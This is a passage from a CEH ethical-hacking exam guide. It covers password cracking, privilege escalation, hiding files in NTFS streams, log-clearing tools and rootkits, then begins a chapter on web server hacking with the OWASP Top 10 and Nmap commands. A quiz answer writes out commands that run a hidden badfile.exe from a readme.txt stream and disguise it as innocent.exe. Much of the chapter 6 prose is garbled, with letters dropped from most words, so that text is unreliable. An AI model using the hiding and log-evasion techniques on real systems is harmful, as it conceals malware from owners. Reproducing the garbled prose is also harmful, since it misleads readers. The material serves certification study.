(REG_EXPAND_SZ), a binary value (REG_BINARY), or a host of other entries.
REG_DWORD is a 32-bit unsigned integer, REG_LINK is a symbolic link to another
key, and REG_MULTI_SZ is a multistring value.

Some of the keys of great importance to you in particular (for your exam and your
job) include the following:

• KEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServicesOnce

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServices

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunOnce

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

Linux starts with a root directory, just as Windows does. The Windows root is (usually)
C:\. The Linux root is just a slash (/). It also has folders holding specific information for
specific purposes, just like Windows. A list of the important folders you’ll need to know
includes /bin, /dev, /etc, /mnt, /sbin, and /usr. Important commands include cp, pwd,
ifconfig, kill, adduser, ls, ps, and chmod. Security on files and folders is managed through
your user account, your user’s group membership, and three security options that can be
assigned to each for any resource: read, write, and execute. These security rights can be
assigned only by the owner of the object. Typing the command ls -l displays the current

05-ch05.indd 227 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

228

security settings for the contents of the directory you’re in. These permissions are assigned
via the chmod command and the use of the binary equivalent for each rwx group: read is
equivalent to 4, write is 2, and execute is 1.

Passwords in Linux can be stored in one of two places: the passwd file or shadow file.
All passwords are displayed openly as hashes to anyone who has read privileges to the
passwd file. In the shadow file, the passwords are stored and displayed encrypted, and
shadow is accessible only by root.

System attacks fall in the “gaining access” ethical hacking phase. The full method-
ology includes reconnaissance, scanning and enumeration, gaining access, maintaining
access, and covering tracks. Gaining access includes cracking passwords and escalating
privileges. After privilege escalation, you leave the gaining access phase and move into
maintaining access, which includes executing applications and hiding files. The covering
tracks phase includes taking care of log files on the machine.

Authentication involves three main options: something you are, something you
have, and something you know. Some authentication measures use something you are—
biometrics (fingerprints and such)—to validate identity and grant access. Others use
something you have, such as a token of some sort (like a swipe badge or an ATM card),
for authentication. But most security comes down to something you know, and that
something is a password.

Default passwords are in place by the manufacturer to allow the installing administra-
tor to log in initially and set up the device or service, and they are sometimes simply for-
gotten about after installation. Routers, switches, wireless access points, database engines,
and software packages all come installed with default passwords.

ECC defines four main attack types for password cracking. The non-electronic attack
involves social engineering practices, such as shoulder surfing and dumpster diving. The
active online attack is carried out by directly communicating with the victim’s machine.
Per ECC, active online attacks include dictionary and brute-force attacks, hash injec-
tions, phishing, Trojans, spyware, keyloggers, and password guessing. Active online
attacks take a much longer time than passive attacks and are also much easier to detect.
A passive online attack basically amounts to sniffing a wire in the hopes of either inter-
cepting a password in clear text or attempting a replay attack or a man-in-the-middle
(MITM) attack. Offline attacks occur when the hacker steals a copy of the password file
and works the cracking efforts on a separate system.

Password cracking offline can be done in one of three main ways: dictionary attack,
hybrid attack, and brute-force attack. A dictionary attack is the easiest and by far the
fastest attack available, using a list of passwords in a text file, which is then hashed by
the same algorithm/process the original password was put through. A hybrid attack takes
words from a list and substitutes numbers and symbols for alphabetic characters—per-
haps a zero for an O and an @ for an a. Hybrid attacks may also append numbers and
symbols to the end of dictionary file passwords. A brute-force attack uses every conceiv-
able combination of letters, numbers, and special characters compared against the hash
to determine a match. It is very time consuming, chewing up a lot of computation cycles,
thus making this the longest of the three methods; however, given enough time, every
password can be cracked using brute force.

05-ch05.indd 228 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

229

A rainbow table is a huge compilation of hashes of every password imaginable. The
amount of time it takes a cracker to work is dramatically decreased by not having to
generate all these hashes over and over again. While GPU systems virtually eliminate
the need for rainbow tables, if you wish to make one, you can use tools like rtgen
and Winrtgen.

There are two types of privilege escalation. Vertical privilege escalation occurs when a
lower-level user executes code at a higher privilege level than they should have access to.
Horizontal privilege escalation isn’t really escalation at all but rather simply executing code
at the same user level but from a location that should be protected from access. There are
four real hopes for obtaining administrator (root) privileges on a machine. The first is to
crack the password of an administrator or root account. The second is to take advantage
of a vulnerability found in the OS, or in an application, that allows you access as a privi-
leged user (DLL hijacking involves replacing legitimate DLLs with malicious copies in the
application root folder). The third method is to use a tool that (ideally) provides you the
access you’re looking for (such as Metasploit). The last method is to just ask the current
user to run an application for you.

The step of executing applications includes pretty much everything you can think
of, hacking-wise. Obviously it applies to “malicious” programming—starting tools such
as keyloggers, spyware, back doors, and crackers—but the idea is the same regardless:
once you have access to the system, execute at or above your privilege level to accom-
plish what you need to do. Examples of remote execution tools include RemoteExec,
PDQ Deploy, and Dameware Remote Support.

One way to hide files on Windows machines is through the use of an alternate data
stream (ADS) in the form of NTFS file streaming. ADS is a feature of the Windows-
native NTFS to ensure compatibility with Apple file systems (called HFS). NTFS file
streaming allows you to hide virtually any file behind any other file, rendering it invis-
ible to directory searches. Another file-hiding technique is steganography, which hides
files in plain sight, buried as part of an image, video, or other file. Tools for hiding files
of all sorts in regular image files or other files include ImageHide, Snow, Mp3Stego,
Blindside, S-tools, wbStego, and Stealth.

In addition to hiding files for further manipulation/use on the machine, covering your
tracks while stomping around in someone else’s virtual play yard is also a cornerstone of
success. There are three main logs in the Windows OS to look at when covering your
tracks—the application, system, and security logs. A few tools are available for taking
care of event log issues. In Control Panel | Administrative Tools | Local Security Policy,
you can set up and change the audit policy for the system. The top-level settings are
found under Local Policies | Audit Policy. Other settings of note are found in Advanced
Audit Policy Configuration at the bottom of the listings under Security Settings. Other
tools of note include elsave, WinZapper, and Evidence Eliminator. Lastly, Auditpol is a
tool included in the old Windows NT Resource Kit that may be useful on older systems.
You can use it to disable event logs on other machines.

A rootkit is a collection of software put in place by an attacker that is designed to
obscure system compromise. In other words, if a system has a properly introduced
rootkit installed, the user and security monitors won’t even know anything is wrong.

05-ch05.indd 229 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

230

Rootkits are designed to provide back doors for the attacker to use later and include
measures to remove and hide evidence of any activity. Some of the rootkits ECC expects
you to know about are Azazel, Avatar, Necurs, and ZeroAccess.

Per the CEH objectives, there are six types of rootkits: hypervisor level, hardware
(firmware), boot loader level, application level, kernel level, and library level. Rootkits
can be detected through a variety of tools and methods, but reloading from clean back-
ups is the only real recovery method.

Questions
1. Which of the following best defines steganography?

A. Steganography is used to hide information within existing files.
B. Steganography is used to create hash values of data files.
C. Steganography is used to encrypt data communications, allowing files to be

passed unseen.
D. Steganography is used to create multimedia communication files.

2. Which encryption standard is used by LM?
A. MD5
B. SHA-1
C. DES
D. SHA-2
E. 3DES

3. Which of the following would be considered a passive online password attack?
A. Guessing passwords against an IPC$ share
B. Sniffing subnet traffic to intercept a password
C. Running John the Ripper on a stolen copy of the SAM
D. Sending a specially crafted PDF to a user for that user to open

4. A user on Joe’s network does not need to remember a long password. Users on Joe’s
network log in using a token and a four-digit PIN. Which authentication measure
best describes this?
A. Multifactor authentication
B. Three-factor authentication
C. Two-factor authentication
D. Token authentication

05-ch05.indd 230 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

231

5. Which of the following best defines a hybrid attack?
A. The attack uses a dictionary list, trying words from random locations in the

file until the password is cracked.
B. The attack tries random combinations of characters until the password

is cracked.
C. The attack uses a dictionary list, substituting letters, numbers, and characters

in the words until the password is cracked.
D. The attack uses rainbow tables, randomly attempting hash values throughout

the list until the password is cracked.
6. While pen testing a client, you discover that LM hashing, with no salting, is still

engaged for backward compatibility on most systems. One stolen password hash
reads 9FAF6B755DC38E12AAD3B435B51404EE. Is this user following good
password procedures?
A. Yes, the hash shows a 14-character, complex password.
B. No, the hash shows a 14-character password; however, it is not complex.
C. No, the hash reveals a 7-character-or-less password has been used.
D. It is impossible to determine simply by looking at the hash.

7. Where is the SAM file stored on a Windows 7 system?
A. /etc/
B. C:\Windows\System32\etc\
C. C:\Windows\System32\Config\
D. C:\Windows\System32\Drivers\Config

8. Examining a database server during routine maintenance, you discover an hour of
time missing from the log file, during what would otherwise be normal operating
hours. Further investigation reveals no user complaints on accessibility. Which of
the following is the most likely explanation?
A. The log file is simply corrupted.
B. The server was compromised by an attacker.
C. The server was rebooted.
D. No activity occurred during the hour time frame.

9. Which of the following can migrate the machine’s actual operating system into a
virtual machine?
A. Hypervisor-level rootkit
B. Kernel-level rootkit
C. Virtual rootkit
D. Library-level rootkit

05-ch05.indd 231 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

232

10. After gaining access to a Windows machine, you see the last command executed
on the box looks like this:
net use F: \\MATTBOX\BankFiles /persistent:yes

Assuming the user had appropriate credentials, which of the following are true?
(Choose all that apply.)
A. In Windows Explorer, a folder appears under the root directory named

BankFiles.
B. In Windows Explorer, a drive appears denoted as BankFiles (\\MATTBOX) (F:).
C. The mapped drive will remain mapped after a reboot.
D. The mapped drive will not remain mapped after a reboot.

11. An attacker has hidden badfile.exe in the readme.txt file. Which of the following is
the correct command to execute the file?
A. start readme.txt>badfile.exe
B. start readme.txt:badfile.exe
C. start badfile.exe > readme.txt
D. start badfile.exe | readme.txt

12. You see the following command in a Linux history file review:
someproc &

Which of the following best describe the command result? (Choose two.)
A. The process someproc will stop when the user logs out.
B. The process someproc will continue to run when the user logs out.
C. The process someproc will run as a background task.
D. The process someproc will prompt the user when logging off.

Answers
1. A. Steganography is designed to place information in files where it will lay hidden

until needed. Information can be hidden in virtually any file, although image and
video files are traditionally associated with steganography.

2. C. LAN Manager (LM), an old and outdated authentication system, used DES,
an old and outdated means for hashing files (in this case, passwords).

3. B. Passive online attacks simply involve stealing passwords passed in clear text or
copying the entire password exchange in the hopes of pulling off a reply or man-
in-the-middle attack.

4. C. Because Joe’s users need something they have (a token) and something they
know (the PIN), this is considered two-factor authentication.

05-ch05.indd 232 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

233

5. C. The hybrid attack takes any old dictionary list and juices it up a little.
It substitutes numbers for letters, injects a character or two, and runs numerous
hybrid versions of your word list in an attempt to crack passwords.

6. C. LM hashes pad a password with blank spaces to reach 14 characters, split it
into two 7-character sections, and then hash both separately. Because the LM
hash of seven blank characters is always AAD3B435B51404EE, you can tell from
the hash that the user has used only seven or fewer characters in the password.
Because CEH recommends that a password be a minimum of eight characters,
be complex, and expire after 30 days, the user is not following good policy.

7. C. The SAM file is stored in the same folder on most Windows machines:
C:\Windows\System32\Config\.

8. B. It’s a database server during normal business hours and there’s nothing in the
log? Forget the fact a reboot would’ve showed up somewhere—none of the users
complained about it being down at all. No, this one is going to require some
forensics work. Call the IR team.

9. A. The hypervisor-level rootkit is defined by ECC as one that basically replaces
your physical OS with a virtual one.

10. B, C. net use commands were the rage back in the day. This command connects
to a shared folder on MATTBOX. The shared folder is named BankFiles, and
the mapping will display as a drive (F:) on the local machine. The persistent:yes
portion means it will remain mapped forever, until you turn it off.

11. B. The command start readme.txt:badfile.exe says “Start the executable badfile.
exe that is hidden in the readme.txt file.” In other variants of this question,
the bad guy could create a link and execute it simply by typing the link name
(for example, mklink innocent.exe readme.txt:badfile.exe would create a link,
and the bad file could be executed simply by typing innocent).

12. A, C. The ampersand (&) after the command dictates that the process should
run in the background. Without anything indicating a persistent process
(that is, adding nohup before the process name), it will die when the user
logs out.

05-ch05.indd 233 14/09/21 3:57 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CHAPTER

Web-Based Hacking: 6
Servers and Applications
In this chapter you will

• Identiy eatures o common web server architecture
• Inspect web application unction and architecture points
• Describe web server and web application attacks
• Identiy web server and application vulnerabilities
• Explore web application hacking tools

Hav you v s h movi The Shawshank Redemption? If you hav’ ad w w all
i a classoom ogh, I’d pobably sop all pocdigs ad mak h i lo of you
adig his book go wach i bcaus I’m ily usu ay p s am ca fucio
wih mmbs who hav o s i. Howv, w’ o i class, ad you’ f o do
whav you wa, so h bs I ca do fo hos of you who will o go s h movi
is o povid a wap-up h.

I h movi, a kid, hos, wll-ducad bak amd Ady Dufs is wogly
covicd fo h mud of his wif ad scd o lif i piso, o b svd a h
hllish Shawshak Sa Piso. H spds wo dcads of his lif h ad hough all
h umoil ad sif maags o fom sog fidships, chag livs, ad sop vil i
is acks. H also maags o scap h piso, lavig h vil wad ad his moy-
laudig opaio o fac h cosqucs of hi acios. How Ady scapd h
piso is’ wha h soy is all abou, bu i is apopos fo ou discussio h. How, you
may ask? Glad o xplai.

Ady’s fid, Ellis Rddig, givs him a small ock hamm aly o o wok o
chislig ock chss pics. No guad could s h ham i i, so hy jus l him kp
i. Ov h x wo dcads, Ady, wokig bhid a succssio of big pi-up poss
of Ria Haywoh, Maily Moo, ad, lasly, Raqul Wlch hug o his cll wall,
paisakigly chisls a big hol hough h solid coc wall, allowig accss o his
vual scap ou—a gia swag pip ha lads ou of h piso, fa away o a
daiag dich. S, Ady did’ wok o bibig guads o sakig io h laudy
uck o climbig h walls a igh ad uig as fas as possibl owad fdom. No,
Ady ook h ou ou of h piso ha a lo of hacks ak i gaiig accss io

235

06-ch06.indd 235 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

236

a ag—somhig vyo jus usd o do a job ad ha o o v cosidd
could b usd i ay oh way.

I’m o sayig you’ goig o b covd i...wll, you know...as a sul of hackig a
wb sv. Wha I am sayig, hough, is ha ogaizaios ha usually do a py good
job of scuig passwods, gas, ad oh obvious scuiy ags of ovlook h
hug, op, public-facig fo doos hy hav ou h fo us. Ad if you’ willig o
g a lil diy, hy mak a fi way back i. Su, i’s a lil mssy a fis, bu wh
you bak back i, ha pos of Ady’s su looks ic hagig h o h wall.

Web Servers
Rgadlss wha you poial ag offs o h wold—whh i’s a -commc
si, a sui of applicaios fo mploys ad busiss pas o us, o jus a mas
o ifom h public—ha offig mus sid o a sv dsigd o povid higs
o h wold. Wb svs a uiqu iis i h viual wold w play i. Thik
abou i—w spd loads of im ad ffo yig o hid vyhig ls w ow. W
lock svs, ous, ad swichs away i sup-scu ooms ad disguis i -
wok sgms bhid NAT ad DMZs. Ou xally facig wb svs, hough, a
how o h povbial wolvs. W sick hm igh ou fo ad op accss o hm.
Su, w y ou bs o scu ha accss, bu h poi sill mais: wb svs a
op ags h i wold ca s. Ad you ca s assud hos op ags will g
a sog look fom aacks.

Nonprofit Organizations Promoting Web Security
I pomis his wo’ ak log, bu w d o cov som wb ogaizaios you d
o b familia wih fo boh you ffos ad you xam. I’s lially impossibl fo m o
cov vy sadads o giig goup o vy iaioal cosoium ou h
ha has coibud o makig h Wb wha i is oday. I’ll hi o a fw I kow you d
o kow abou, ad us you o ad up o ohs you should kow abou.

Fo xampl, ak IEFT (hps://www.if.og/). Th I Egiig Task Foc
ca pobably bs b dscibd by h ag li ha oc appad o hi hom pag:
“Th goal of h IETF is o mak h I wok b.” IETF cas giig
docums o hlp mak h I wok b fom a giig poi of viw.
Th IETF’s official docums a publishd f of chag as Rquss fo Comms
(RFCs). A RFC is usd o s a vaiy of sadads—vyhig fom h makup of a
UDP had o how ouig poocols a supposd o wok, ad almos ayhig ls
you ca hik of. P h IETF gadig RFCs: “…his am (usd sic 1969, bfo
h IETF xisd) xpsss somhig impoa: h I is a cosaly chagig
chical sysm, ad ay docum ha w wi oday may d o b updad
omoow.” Wh you hik IETF, hik giig, ad giig oly—hy’
o h o polic wha h gid soluio is usd fo, jus o povid h wok o
g h soluio uig. IETF commds hps://www.isociy.og/ as a plac
o go woy abou policy.

06-ch06.indd 236 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

237

Aoh oldi bu goodi is h Wold Wid Wb Cosoium (W3C). W3C (hps://
www.w3.og) is a iaioal commuiy wh “mmb ogaizaios, a full-im
saff, ad h public wok ogh o dvlop Wb sadads.” Th sad missio of
W3C is “o lad h Wold Wid Wb o is full poial by dvlopig poocols
ad guidlis ha su h log-m gowh of h Wb.” Fo xampl, wh
icompaibl vsios of HTML a offd by diff vdos, causig icosiscy
i how wb pags a displayd, W3C is o g all hos vdos o implm a s
of co picipls ad compos ha a chos by h cosoium. W3C gags i
ducaio ad ouach, dvlops sofwa, ad svs as a op foum fo discussio
abou h Wb.

Wa a ogaizaio mo spcific o wb scuiy? Chck ou OWASP (hps://
www.owasp.og). Th Op Wb Applicaio Scuiy Pojc is a 501(c)(3) woldwid
o-fo-pofi chaiabl ogaizaio focusd o impovig h scuiy of sofwa. Th
missio of OWASP is o impov sofwa scuiy hough op souc iiiaivs ad
commuiy ducaio. OWASP publishs pos, docums, ad aiig ffos o
assis i wb scuiy.

Fo xampl, h OWASP Top 10 (hps://owasp.og/www-pojc-op-/) is “a
sadad awass docum fo dvlops ad wb applicaio scuiy. I pss
a boad cossus abou h mos ciical scuiy isks o wb applicaios.” So wha
maks up h OWASP Top 10 wb applicaio scuiy isks? As of his wiig, h
cu availabl lis is fom 2017, ad ha lis is h o still fcd wihi h
CEH vsio 11 couswa. Why? Maily bcaus OWASP has’ updad i sic 2017
ad, somwha supisigly, obody ls sms o hav pickd i up as a owohy
lis o kp ack of. Do’ bliv m? Rsach i youslf ad you’ll fid mos vy
subsaiv souc o h Wb fs back o OWASP’s oigial 2017 lis. Go figu.

NOTE OWASP lists only update every three to our years. Check out https://
lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/
or some interesting details and imagery about this.

Howv, giv how h CEH xams wok (ach s is adom ad h s pool
may hav old qusios o pull fom fo you spcific xamiaio), I’m goig o lis
h cu Top 10 as it appears in today’s courseware. Had ou o hps://owasp.og/
www-pojc-op-/ o viw h official lis ad dscipios cu as of his wiig.

• A1: Injection Flaws Ijcio flaws, such as SQL, OS, ad LDAP ijcio,
occu wh uusd daa is s o a ip as pa of a commad
o quy. Th aack’s hosil daa ca ick h ip io xcuig
uidd commads o accssig daa wihou pop auhoizaio.

• A2: Broken Authentication and Session Management Applicaio fucios
lad o auhicaio ad sssio maagm a of o implmd
cocly, allowig aacks o compomis passwods, kys, o sssio oks, o
o xploi oh implmaio flaws o assum oh uss’ idiis.

06-ch06.indd 237 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

238

• A3: Sensitive Data Exposure May wb applicaios do o poply poc
ssiiv daa, such as cdi cads, ax IDs, ad auhicaio cdials.
Aacks may sal o modify such wakly pocd daa o coduc cdi cad
faud, idiy hf, o oh cims. Ssiiv daa dsvs xa pocio,
such as cypio a s o i asi, as wll as spcial pcauios wh
xchagd wih h bows.

• A4: XML External Entities (XXE) Aacks ca xploi vulabl XML
pocssos if hy ca upload XML o iclud hosil co i a XML
docum, xploiig vulabl cod, dpdcis, o igaios. By dfaul,
may old XML pocssos allow spcificaio of a xal iy, a URI ha
is dfcd ad valuad duig XML pocssig. Ths flaws ca b usd
o xac daa, xcu a mo qus fom h sv, sca ial sysms,
pfom a dial-of-svic aack, as wll as xcu oh aacks.

• A5: Broken Access Control Exploiaio of accss cool is a co skill of
aacks. Saic Applicaio Scuiy Tsig (SAST) ad Dyamic Applicaio
Scuiy Tsig (DAST) ools ca dc h absc of accss cool bu cao
vify if i is fucioal wh i is ps. Accss cool is dcabl usig
maual mas, o possibly hough auomaio fo h absc of accss cools
i cai famwoks. Accss cool waksss a commo du o h lack
of auomad dcio, ad lack of ffciv fucioal sig by applicaio
dvlops. Accss cool dcio is o ypically amabl o auomad saic
o dyamic sig. Maual sig is h bs way o dc missig o iffciv
accss cool, icludig HTTP mhod (GET vs. PUT, ad so o), cooll,
dic objc fcs, ad so o.

• A6: Security Misconfiguration Good scuiy quis havig a scu
cofiguaio dfid ad dployd fo h applicaio, famwoks, applicaio
sv, wb sv, daabas sv, ad plafom. Scu sigs should
b dfid, implmd, ad maiaid, as dfauls a of iscu.
Addiioally, sofwa should b kp up o da.

• A7: Cross-Site Scripting (XSS) XSS flaws occu whv a applicaio
aks uusd daa ad sds i o a wb bows wihou pop validaio o
scapig. XSS allows aacks o xcu scips i h vicim’s bows, which
ca hijack us sssios, dfac wbsis, o dic h us o malicious sis. I’s
oabl ha his doppd pcipiously fom h las lis. I’s sill a Top 10 issu,
howv, so do’ discou.

• A8: Insecure Deserialization Isigly, ulik oh is o h lis, his
was icludd i h Top 10 basd o a idusy suvy ad o o quaifiabl
daa. Exploiaio of dsializaio is somwha difficul, as off-h-shlf xplois
aly wok wihou chags o waks o h udlyig xploi cod. Som ools
ca discov dsializaio flaws, bu huma assisac is fquly dd o
valida h poblm. I is xpcd ha pvalc daa fo dsializaio flaws
will icas as oolig is dvlopd o hlp idify ad addss i. Th impac of
dsializaio flaws cao b udsad. Ths flaws ca lad o mo cod
xcuio aacks, o of h mos sious aacks possibl.

06-ch06.indd 238 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

239

NOTE https://portswigger.net/web-security/deserialization has a great
writeup on deserialization: “Insecure deserialization occurs when user-
controllable data is deserialized by a website, potentially allowing an
attacker to manipulate serialized objects to pass harmul data into the
application code.”

• A9: Using Components with Known Vulnerabilities Compos such as
libais, famwoks, ad oh sofwa moduls almos always u wih full
pivilgs. If a vulabl compo is xploid, such a aack ca facilia
sious daa loss o sv akov. Applicaios usig compos wih kow
vulabiliis may udmi applicaio dfss ad abl a ag of possibl
aacks ad impacs.

• A10: Insufficient Logging and Monitoring Lik #8, his was also icludd
i h Top 10 basd o a idusy suvy. Exploiaio of isuffici loggig
ad moioig is h bdock of aly vy majo icid. Aacks ly o
h lack of moioig ad imly spos o achiv hi goals wihou big
dcd. O sagy fo dmiig if suffici moioig is i plac is o
xami h logs followig paio sig. Th ss’ acios should b
codd sufficily o udsad wha damags hy may hav iflicd. Mos
succssful aacks sa wih vulabiliy pobig, ad should b od ad acd
upo a ha sag. Allowig such pobs o coiu ca ais h liklihood of
succssful xploi o xpoially.

(Th OWASP Top 10 is f o us. I is licsd ud h Caiv Commos
Aibuio-ShaAlik 4.0 Iaioal Lics.)

OWASP also povids a ally cool opio fo scuiy ducaio. WbGoa (hps://
owasp.og/www-pojc-wbgoa/) is a dlibaly iscu wb applicaio maiaid
by OWASP ha is dsigd o ach wb applicaio scuiy lssos. “Th pimay goal
of h WbGoa pojc is simpl: ca a d-faco iaciv achig viom fo
wb applicaio scuiy. I h fuu, h pojc am hops o xd WbGoa io
bcomig a scuiy bchmakig plafom ad a Java-basd Wb si Hoypo.” You
ca isall WbGoa o viually ay plafom, i ca ifac wih Java o .NET jus fi,
ad i coais dozs of “lssos” displayig scuiy vulabiliis you should b awa
of. I’s acually a ga ida wh you hik abou i: a box you kow is h bu do’
kow much abou holds umous poial scuiy flaws, ad you g o s you skills
agais i wihou dagig ayhig. No bad fo a goa…

I could go o ad o wih oh ogaizaios—hy’ dlss. Th Isiu fo
Scuiy ad Op Mhodologis (ISECOM), h I Sociy, h Op Souc
Iiiaiv (OSI), ad a bazillio ohs a ou h fo you pusal. Mos a yig o
mak wb scuiy b. H’s hopig hy succd.

06-ch06.indd 239 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

240

When We Meet the Enemy, Will It Be Us?
You’v puchasd his book, so I do’ hav o ll you ha is i scuiy, p
sig, ad hical hackig is al ad gowig. Ad o h fac of i, wha w’
all doig abou i is a vy good hig. Taiig a amy of good guys o scu ou
sysms maks all sos of ss, ad if w do’ look a higs h way ou advsa-
is do, w’ o doig ouslvs ay favos. Af all, o of h mos quod lis
i all of hisoy gadig all his is, “If you kow h my ad kow youslf,
you d o fa h sul of a hudd bals. If you kow youslf bu o h
my, fo vy vicoy gaid you will also suff a dfa. If you kow ih h
my o youslf, you will succumb i vy bal.” (Su Tzu, The Art of War).
Bu i som spcs, is’ h a dowsid o all his?

Cosid malwa auhos, fo isac. Back i h aly days of I
wokig, viuss w’ aly as sophisicad as hy a oday ad jus did’
ally ma o mos folks. A dcad o so passd, ad all ha chagd. Bu wha
was ally isig abou h whol siuaio was ha i smd hos who wo
h bs viuss go hid by h aivius compais, ad malwa, o quo Ro
Bugudy, “scalad quickly.” Was “wadig” ibl bhavio a good pacic o
bad? A sysms b off oday bcaus AV compais hid popl who hough
lik bad guys (bcaus hy w), o did h i adv of all ha foc malwa
io lofi hoizos (o dp dphs, dpdig o you pspciv)?

I jus did a sach fo “how o b a hack.” Ov 243 millio suls. “How o
hack a wb sv” ud almos 146 millio. Ad “Scips I ca us o hack”?
Almos 19 millio. You ca fid YouTub vidos o vy hackig acic you ca
imagi, aicls ad whipaps o hackig sagis ad chiqus, ad ips
fo pfomig ay paicula hack ha simplify h sps o h poi my ca may
b abl o pull i off. Taiig oppouiis (may of which a ibl wass of
im ad moy, dspi wll-kow am povids) fo “hical” hackig aboud.
Th a v wikis o vyhig you ca imagi, icludig a ally ia o
ild “12 sps o bcomig a hack.” Really? Tha’s all i aks? Wll, gz, why am
I not hackig?

A w caig h my? A w makig his ifomaio so availabl, so
palaabl, ha hos who would’ ohwis joi h figh o h dak sid ow
s oppouiy? A w focig h voluio of hackig maliy ad chiqus
o ga sophisicaio by ou ffos o b wll ifomd ad skilld i dfs?
Add o i all h moizaio of “hackig” owadays (h days of hackig big a
commuiy whi h chology ad h xploiaio of i was puly a xcis
i scic, hikig, ad ikig a dad), ad i gs v cloudi. I hik
h wad/isk compaaiv h closs h agum fo m, bu I jus ca’ hlp
woyig abou i. Will I, o day, fac a pisig youg hack who’d v
cosidd hackig bfo bu ad a isig book o i ad w o o la
all h could? Mayb. Bu my guss, ad hop, is ha by ha im h good guys
will ouumb hos o h oh sid. If o, I suppos h mio is wh w’ll
all look fo blam.

06-ch06.indd 240 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

241

Attack Methodology
Wh you cosid h sh umb of mhodology sps EC-Coucil hows ou
h, i’s ally a miacl ayo v bohs akig his xam. Howv, as I sad a-
li, dspi whav you may hik of hi lvac i h day-o-day lif ad acios
of al p ss ad hacks, mhodology sps fom ECC are sabl. Agu wih m
all you wa ad scoff a how dumb h sps a, bu if you igo hm, you’ll ico-
cly asw s qusios ha a’ difficul. Th choic is yous.

EC-Coucil dfis six diff sags i wb sv aack mhodology: wb sv
ifomaio gahig, wb sv foopiig, wbsi mioig, vulabiliy scaig,
sssio hijackig, ad wb sv passwod cackig. Thakfully, wh i coms o wb
sv aack mhodology, hs a’ so much phass o mmb o a sp-by-sp,
foolpoof mhod. Isad, hy a ECC’s commdaios o wha o cov i you
ffos so ha you ca ogaiz you houghs ad su you do’ ovlook somhig.
I do’ bliv you’ll b askd abou hm i od (i oh wods, “Wha pss
sp 4 i h wb sv aack mhodology?”).

Fis off, you’ll sa ou wih ifomaio gahig ad foopiig. Wb sv
ifomaio gahig is do usig mhods lik I sachs abou h ag (affic
saisics ad such), whois sachs (w w ov his lil jwl back i Chap 2), ad
viwig h obos.x fil (a small fil, mad o b accssibl ad adabl, ha lls
wb spids which pags not o cawl fo idxig). Foopiig ffos i gad o wb
svs ivolv aciviis lik ba gabbig (f o h sciillaig wiup o his i
Chap 3) ad h us of a fw ools mo spcializd fo wb sv xamiaios. Fo
xampl, Ncaf ca povid som ga high-lvl ifomaio. HTTPRco ad ID
Sv wok ally wll i idifyig, liably, h wb sv achicu ad OS, ad
hpi povids los of ally cool ifomaio.

Lasly, wh i coms o foopiig ad umaig wb svs, do’ discou
ha wodful lil ool w covd back i Chap 3—Nmap. Th a a bajillio
diff mhods i which o us Nmap o sca ad uma boxs, ad wb svs
a o xcpio. H a a fw Nmap commads you may fid usful (i h al wold
ad fo you xam):

• nmap --script http-trace -p80 localhost Dcs a vulabl sv ha uss
h TRACE mhod. HTTP TRACE vulabiliis a a, ad hav b sic
2012 o so.

• nmap --script http-google-email <host> Liss -mail accous. As a asid,
his was lasd i 2011 ad is o pa of official Nmap lass, so you’ll hav
o dowload i lswh fo us.

• nmap --script hostmap-* <host> Discovs viual hoss o a IP addss ha
you a ampig o foopi. Th * chaac is placd by h am of h
oli dB you’ ampig o quy. Fo xampl, hostmap-IP2Hosts quis
h dB a www.ip2hoss.com.

• nmap --script http-enum -p80 <host> Eumas commo wb applicaios.

• nmap -p80 --script http-robots.txt <host> Gabs h obos.x fil.

06-ch06.indd 241 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

242

Agai, I fid myslf complld o advis you o gab h ools ad s hm ou fo
youslf. Th a mo Nmap commads ha I ca possibly iclud h—hs a
